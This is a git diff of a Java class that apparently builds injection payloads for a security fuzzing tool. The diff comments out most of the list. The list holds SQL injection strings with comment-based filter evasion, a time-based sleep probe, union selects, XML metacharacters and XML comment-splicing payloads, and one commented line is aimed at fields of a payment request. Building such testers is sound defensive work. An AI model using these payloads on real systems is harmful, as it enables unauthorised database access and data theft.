@@ -76,28 +76,28 @@ public class Builder {
         // Add injections
         injections.add(new ReplaceNode("close", "</test>"));
         injections.add(new PointNode("meta", "<"));
-        injections.add(new PointNode("meta", "\'"));
-        injections.add(new PointNode("meta", "\""));
-        injections.add(new PointNode("meta", ">"));
+//        injections.add(new PointNode("meta", "\'"));
+//        injections.add(new PointNode("meta", "\""));
+//        injections.add(new PointNode("meta", ">"));
 
         injections.add(new ReplaceNode("insert", "0 or~/**/1"));
-        injections.add(new ReplaceNode("insert", "1 or/**/\"a\"=\"a\" or"));
-        injections.add(new ReplaceNode("insert", "')/**/or true#"));
-        injections.add(new ReplaceNode("insert", "0/**/||'a'='a'/**/"));
-        injections.add(new ReplaceNode("insert", "'/**/;select sleep(5)--"));
-        injections.add(new ReplaceNode("insert", "0 union/**/(select 0)#"));
-        injections.add(new ReplaceNode("insert", "')/**/union/**/(select 0)#"));
+//        injections.add(new ReplaceNode("insert", "1 or/**/\"a\"=\"a\" or"));
+//        injections.add(new ReplaceNode("insert", "')/**/or true#"));
+//        injections.add(new ReplaceNode("insert", "0/**/||'a'='a'/**/"));
+//        injections.add(new ReplaceNode("insert", "'/**/;select sleep(5)--"));
+//        injections.add(new ReplaceNode("insert", "0 union/**/(select 0)#"));
+//        injections.add(new ReplaceNode("insert", "')/**/union/**/(select 0)#"));
 
-        injections.add(new ReplicateNode("replicate", "0 or~/**/1", targetMatchStrings));
-        injections.add(new ReplicateNode("replicate", "1 or/**/\"a\"=\"a\" or", targetMatchStrings));
-        injections.add(new ReplicateNode("replicate", "')/**/or true#", targetMatchStrings));
-        injections.add(new ReplicateNode("replicate", "0/**/||'a'='a'/**/", targetMatchStrings));
-
-
-        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "0 or~/**/1"));
-        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "1 or/**/\"a\"=\"a\" or"));
-        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "')/**/or true#"));
-        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "0/**/||'a'='a'/**/"));
+//        injections.add(new ReplicateNode("replicate", "0 or~/**/1", targetMatchStrings));
+//        injections.add(new ReplicateNode("replicate", "1 or/**/\"a\"=\"a\" or", targetMatchStrings));
+//        injections.add(new ReplicateNode("replicate", "')/**/or true#", targetMatchStrings));
+//        injections.add(new ReplicateNode("replicate", "0/**/||'a'='a'/**/", targetMatchStrings));
+//
+//
+//        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "0 or~/**/1"));
+//        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "1 or/**/\"a\"=\"a\" or"));
+//        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "')/**/or true#"));
+//        injections.add(new PairReplaceNode("replace", targetMatchStrings, "<!--", "-->", "0/**/||'a'='a'/**/"));
 
 //        injections.add(new PairReplaceNode("replace", targetMatchStrings, "0111</lu:IssuerBankCode> <!--", "<lu:CardNumber>  --><lu:RequestId>1 or/**/\"a\"=\"a\" or</lu:RequestId>"));
 
